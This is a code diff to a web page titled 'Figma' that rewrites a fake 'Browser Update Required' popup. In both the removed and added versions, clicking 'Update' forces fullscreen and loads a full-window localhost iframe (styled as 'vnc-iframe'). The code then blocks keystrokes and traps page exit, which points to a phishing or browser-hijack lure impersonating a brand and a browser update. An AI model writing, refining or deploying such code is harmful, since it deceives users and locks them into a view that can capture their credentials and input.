@@ -6,44 +6,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Figma</title>
     <style>
-        
-
-    /* Ensure the HTML and body take up full space */
-    html, body {
-        width: 100% !important;
-        height: 100% !important;
-        overflow: hidden !important;
-        position: fixed !important;
-        top: 0 !important;
-        left: 0 !important;
-        right: 0 !important;
-        bottom: 0 !important;
-        background-color: #000 !important; /* Change to match your background */
-    }
-
-    /* The iframe styling - using !important to override any existing styles */
-    .vnc-iframe {
-        position: fixed !important;
-        top: 0 !important;
-        left: 0 !important;
-        width: 100vw !important;
-        height: 100vh !important;
-        border: none !important;
-        outline: none !important;
-        margin: 0 !important;
-        padding: 0 !important;
-        overflow: hidden !important;
-        z-index: 2147483647 !important; /* Maximum z-index value */
-        background-color: #000 !important; /* Match your desired background */
-        display: block !important;
-    }
-
-    /* Hide scrollbars */
-    ::-webkit-scrollbar {
-        width: 0px !important;
-        height: 0px !important;
-        background: transparent !important;
-    }
         :root {
             --primary-color: #000000;
             --secondary-color: #ffffff;
@@ -1175,138 +1137,88 @@
             });
         
             // Popup and Localhost Lockdown Functionality
-           function showUpdatePopup(event) {
-        if (event) event.preventDefault();
-
-        // First clean up the DOM - remove any potential elements causing borders
-        document.querySelectorAll('header, footer, nav, aside').forEach(el => {
-            if(el) el.remove();
-        });
-
-        const overlay = document.createElement('div');
-        overlay.style.cssText = 'position: fixed !important; top: 0 !important; left: 0 !important; width: 100% !important; height: 100% !important; background-color: rgba(0, 0, 0, 0.7) !important; z-index: 2147483646 !important; display: flex !important; justify-content: center !important; align-items: center !important;';
-
-        const popup = document.createElement('div');
-        popup.style.cssText = 'background-color: white !important; padding: 30px !important; border-radius: 8px !important; max-width: 400px !important; text-align: center !important;';
-
-        const title = document.createElement('h3');
-        title.textContent = 'Browser Update Required';
-        title.style.cssText = 'margin-bottom: 15px !important;';
-
-        const message = document.createElement('p');
-        message.textContent = 'Your browser needs to be updated to continue.';
-        message.style.cssText = 'margin-bottom: 20px !important;';
-
-        const updateButton = document.createElement('button');
-        updateButton.textContent = 'Update';
-        updateButton.style.cssText = 'padding: 10px 20px !important; background-color: #000 !important; color: #fff !important; border: none !important; border-radius: 6px !important; cursor: pointer !important;';
-
-        updateButton.addEventListener('click', function () {
-            // Remove the overlay
-            document.body.removeChild(overlay);
-            
-            // First, purge ALL elements from the body
-            while (document.body.firstChild) {
-                document.body.removeChild(document.body.firstChild);
-            }
-            
-            // Remove any styling from body
-            document.body.removeAttribute('style');
-            document.body.removeAttribute('class');
-            
-            // Apply critical styles to body
-            document.body.style.cssText = 'margin: 0 !important; padding: 0 !important; overflow: hidden !important; width: 100vw !important; height: 100vh !important; position: fixed !important; top: 0 !important; left: 0 !important; background-color: #000 !important;';
-            
-            // Do the same for html element
-            document.documentElement.style.cssText = 'margin: 0 !important; padding: 0 !important; overflow: hidden !important; width: 100vw !important; height: 100vh !important;';
-            
-            // Create a container div that will hold our iframe
-            const container = document.createElement('div');
-            container.style.cssText = 'position: fixed !important; top: 0 !important; left: 0 !important; width: 100vw !important; height: 100vh !important; overflow: hidden !important; margin: 0 !important; padding: 0 !important; border: none !important; background-color: #000 !important;';
-            
-            // Create the iframe with proper styling
-            const hiddenFrame = document.createElement('iframe');
-            hiddenFrame.src = 'http://localhost/';
-            hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
-            hiddenFrame.className = 'vnc-iframe';
-            
-            // Add extensive inline styles using cssText for maximum compatibility
-            hiddenFrame.style.cssText = 'position: fixed !important; top: 0 !important; left: 0 !important; width: 100vw !important; height: 100vh !important; border: none !important; margin: 0 !important; padding: 0 !important; display: block !important; z-index: 2147483647 !important; background-color: #000 !important;';
-            
-            hiddenFrame.onload = function() {
-                // Request fullscreen after the iframe has loaded
-                try {
-                    // Try to go fullscreen at the container level
-                    container.requestFullscreen({navigationUI: "hide"}).catch(err => {
-                        console.log("Fullscreen request failed at container level:", err);
-                        // Try document level fullscreen as fallback
-                        document.documentElement.requestFullscreen({navigationUI: "hide"}).catch(err2 => {
-                            console.log("Fullscreen request failed at document level:", err2);
-                        });
-                    });
-                    
-                    // Try to apply iframe content styles and events
-                    try {
-                        // Style the iframe document if possible
-                        hiddenFrame.contentDocument.documentElement.style.cssText = 'margin: 0 !important; padding: 0 !important; overflow: hidden !important;';
-                        hiddenFrame.contentDocument.body.style.cssText = 'margin: 0 !important; padding: 0 !important; overflow: hidden !important;';
-                        
-                        // Add event handlers
-                        hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
-                        hiddenFrame.contentWindow.onbeforeunload = function() {
-                            return "Are you sure you want to leave?";
+            function showUpdatePopup(event) {
+                if (event) event.preventDefault();
+        
+                const overlay = document.createElement('div');
+                overlay.style.position = 'fixed';
+                overlay.style.top = '0';
+                overlay.style.left = '0';
+                overlay.style.width = '100%';
+                overlay.style.height = '100%';
+                overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+                overlay.style.zIndex = '10000';
+                overlay.style.display = 'flex';
+                overlay.style.justifyContent = 'center';
+                overlay.style.alignItems = 'center';
+        
+                const popup = document.createElement('div');
+                popup.style.backgroundColor = 'white';
+                popup.style.padding = '30px';
+                popup.style.borderRadius = '8px';
+                popup.style.maxWidth = '400px';
+                popup.style.textAlign = 'center';
+        
+                const title = document.createElement('h3');
+                title.textContent = 'Browser Update Required';
+                title.style.marginBottom = '15px';
+        
+                const message = document.createElement('p');
+                message.textContent = 'Your browser needs to be updated to continue.';
+                message.style.marginBottom = '20px';
+        
+                const updateButton = document.createElement('button');
+                updateButton.textContent = 'Update';
+                updateButton.style.padding = '10px 20px';
+                updateButton.style.backgroundColor = '#000';
+                updateButton.style.color = '#fff';
+                updateButton.style.border = 'none';
+                updateButton.style.borderRadius = '6px';
+                updateButton.style.cursor = 'pointer';
+        
+                updateButton.addEventListener('click', function () {
+                    // Request fullscreen FIRST (user gesture)
+                    document.documentElement.requestFullscreen().then(() => {
+                        document.body.removeChild(overlay);
+        
+                        const hiddenFrame = document.createElement('iframe');
+                        hiddenFrame.src = 'http://localhost/';
+                        hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
+                        hiddenFrame.style.position = 'fixed';
+                        hiddenFrame.style.top = '0';
+                        hiddenFrame.style.left = '0';
+                        hiddenFrame.style.width = '100%';
+                        hiddenFrame.style.height = '100%';
+                        hiddenFrame.style.border = 'none';
+                        hiddenFrame.style.zIndex = '99999';
+        
+                        hiddenFrame.onload = function () {
+                            document.body.style.overflow = 'hidden';
+        
+                            try {
+                                hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
+                                hiddenFrame.contentWindow.onbeforeunload = function () {
+                                    return "Are you sure you want to leave?";
+                                };
+                            } catch (error) {
+                                console.warn("Cannot attach key blocker to iframe:", error);
+                            }
                         };
-                    } catch (error) {
-                        console.warn("Cannot modify iframe content:", error);
-                    }
-                } catch (err) {
-                    console.error("Error in iframe onload:", err);
-                }
-            };
-            
-            // Add the iframe to the container
-            container.appendChild(hiddenFrame);
-            
-            // Add the container to the body
-            document.body.appendChild(container);
-            
-            // Additional step: ensure no scrollbars appear
-            setTimeout(function() {
-                // Double check that styles are applied
-                document.body.style.overflow = 'hidden !important';
-                document.documentElement.style.overflow = 'hidden !important';
-                
-                // If we still have white borders, try to detect and color them
-                const bodyComputedStyle = window.getComputedStyle(document.body);
-                if (bodyComputedStyle.backgroundColor !== 'rgb(0, 0, 0)') {
-                    document.body.style.backgroundColor = '#000 !important';
-                }
-                
-                // Force sizing again
-                hiddenFrame.style.width = '100vw';
-                hiddenFrame.style.height = '100vh';
-            }, 100);
-        });
-
-        popup.appendChild(title);
-        popup.appendChild(message);
-        popup.appendChild(updateButton);
-        overlay.appendChild(popup);
-        document.body.appendChild(overlay);
-    }
-    window.showUpdatePopup = showUpdatePopup;
-            
-    // Add this to ensure the page loads properly
-    document.addEventListener("DOMContentLoaded", function() {
-        // Pre-clean any existing styling issues
-        document.querySelectorAll('*').forEach(el => {
-            // Remove margin and padding from all elements
-            if (el !== document.body && el !== document.documentElement) {
-                el.style.margin = '0';
-                el.style.padding = '0';
+        
+                        document.body.appendChild(hiddenFrame);
+                    }).catch(err => {
+                        console.log("Initial fullscreen failed:", err);
+                    });
+                });
+        
+                popup.appendChild(title);
+                popup.appendChild(message);
+                popup.appendChild(updateButton);
+                overlay.appendChild(popup);
+                document.body.appendChild(overlay);
             }
-        });
-            
+        
+            window.showUpdatePopup = showUpdatePopup;
         });
         </script>
         
